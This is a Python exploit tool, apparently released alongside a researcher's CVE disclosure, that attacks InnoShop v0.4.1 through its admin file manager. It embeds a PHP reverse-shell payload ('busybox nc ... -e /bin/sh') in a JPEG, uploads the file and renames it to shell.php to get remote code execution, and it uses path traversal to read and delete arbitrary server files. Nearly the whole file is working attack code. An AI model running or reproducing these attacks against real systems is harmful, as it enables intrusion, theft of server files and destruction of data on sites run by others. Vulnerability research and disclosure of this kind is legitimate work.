import requests
import json
import os

# Display cool banner
def banner():
    banner = r"""
 

 ___                  ____        _       _ _   
|_ _|_ __  _ __   ___/ ___| _ __ | | ___ (_) |_ 
 | || '_ \| '_ \ / _ \___ \| '_ \| |/ _ \| | __|
 | || | | | | | | (_) |__) | |_) | | (_) | | |_ 
|___|_| |_|_| |_|\___/____/| .__/|_|\___/|_|\__|
                           |_|                  



                INNOSPLOIT - InnoShop Exploitation Framework
                Exploit CVEs discovered in Innoshop v0.4.1
                To read more about the vulnerabilities and their discovery - go to : https://medium.com/@The_Hiker/how-i-found-multiple-cves-in-innoshop-0-4-1-12c8f84ad87f

                Researcher : Vlad Nikandrov (https://www.linkedin.com/in/vlad-cyber-security/)
    """
    print(banner)

def authenticate(base_url, debug):
    while True:
        email = input("Enter admin email: ")
        password = input("Enter admin password: ")
        response = requests.post(f"{base_url}/api/panel/login", json={"email": email, "password": password})
        if debug:
            print(f"Auth Response [{response.status_code}]: {response.text}")
        if response.status_code == 200 and 'token' in response.text:
            token = response.json()['data']['token']
            print("Authentication successful!")
            return token
        else:
            print("Authentication failed. Please try again.")

def inject_payload_into_jpeg(ip, port, debug):
    try:
        with open('cat.jpeg', 'rb') as f:
            original = f.read()
        midpoint = len(original) // 2
        payload = f"<?php system('busybox nc {ip} {port} -e /bin/sh');?>".encode()
        injected = original[:midpoint] + payload + original[midpoint:]
        with open('shell.jpeg', 'wb') as f:
            f.write(injected)
        if debug:
            print("Injected payload into shell.jpeg")
        return 'shell.jpeg'
    except Exception as e:
        print(f"Error injecting payload: {e}")
        return None

def upload_and_trigger_rce(base_url, token, ip, port, debug):
    injected_file = inject_payload_into_jpeg(ip, port, debug)
    if not injected_file:
        print("Injection failed. Exiting RCE.")
        return
    files = {'file': open(injected_file, 'rb')}
    data = {'path': '/', 'type': 'image'}
    response = requests.post(f"{base_url}/api/panel/file_manager/upload", files=files, data=data, headers={'Authorization': f'Bearer {token}'})
    if debug:
        print(f"Upload Response [{response.status_code}]: {response.text}")
    if response.status_code == 200 or '"success":true' in response.text:
        rename_data = {'origin_name': f"/{injected_file}", 'new_name': 'shell.php'}
        response = requests.post(f"{base_url}/api/panel/file_manager/rename", json=rename_data, headers={'Authorization': f'Bearer {token}'})
        if debug:
            print(f"Rename Response [{response.status_code}]: {response.text}")
        if response.status_code == 200 or '"success":true' in response.text:
            print("Triggering shell...")
            requests.get(f"{base_url}/static/media/shell.php")
        else:
            print("Rename failed.")
    else:
        print("Upload failed.")

def file_read(base_url, token, debug):
    path = input("Enter path to file to read: ")
    for i in range(15):
        attempt_path = "/"+"/../"*i+path
        data = {"files":[attempt_path], "dest_path":"/"}
        response = requests.post(f"{base_url}/api/panel/file_manager/copy_files", headers={'Authorization': f'Bearer {token}'}, json=data)
        if debug:
            print(f"Attempt {i+1}: {response.text}")
        if "source file" in response.text:
            continue
        elif "copy failed" in response.text:
            print("Copy failed. Possible permissions issue.")
            return
        elif "updated_success" in response.text:
            print("File copied successfully. Retrieving content...")
            filename = os.path.basename(path)
            response = requests.get(f"{base_url}/static/media/{filename}")
            print(response.text)
            return
    print("Could not read file.")

def file_delete(base_url, token, debug):
    dummy_path = "/etc/passwd"
    depth = 0
    for i in range(15):
        attempt_path = "/"+"/../"*i+dummy_path
        data = {"files":[attempt_path], "dest_path":"/"}
        response = requests.post(f"{base_url}/api/panel/file_manager/copy_files", headers={'Authorization': f'Bearer {token}'}, json=data)
        if "updated_success" in response.text:
            depth = i
            break
    full_path = input("Enter full path of file to delete: ")
    path_dir, file_name = os.path.split(full_path)
    real_path = "/"+"/../"*depth+path_dir
    data = {"path":real_path, "files":[file_name]}
    response = requests.delete(f"{base_url}/api/panel/file_manager/files", headers={'Authorization': f'Bearer {token}'}, json=data)
    if debug:
        print(f"Delete Response [{response.status_code}]: {response.text}")
    print("This endpoint doesn't return verbose data. File should have been deleted, but manual verification is required.")

# Main loop
banner()
base_url = input("Enter the target base URL (e.g. http://localhost:8000): ").rstrip('/')
debug = input("Enable debug mode? (y/n): ").lower() == 'y'
token = authenticate(base_url, debug)

while True:
    print("\nWhat do you want to do?")
    print("a. Remote Code Execution")
    print("b. File Read")
    print("c. File Delete")
    choice = input("Enter your choice (a/b/c): ").lower()
    if choice == 'a':
        print("Prepare your listener: nc -nlvp <port>")
        input("Press Y when ready: ")
        ip = input("Enter your IP for reverse shell: ")
        port = input("Enter your port: ")
        upload_and_trigger_rce(base_url, token, ip, port, debug)
    elif choice == 'b':
        file_read(base_url, token, debug)
    elif choice == 'c':
        file_delete(base_url, token, debug)
    else:
        print("Invalid option.")
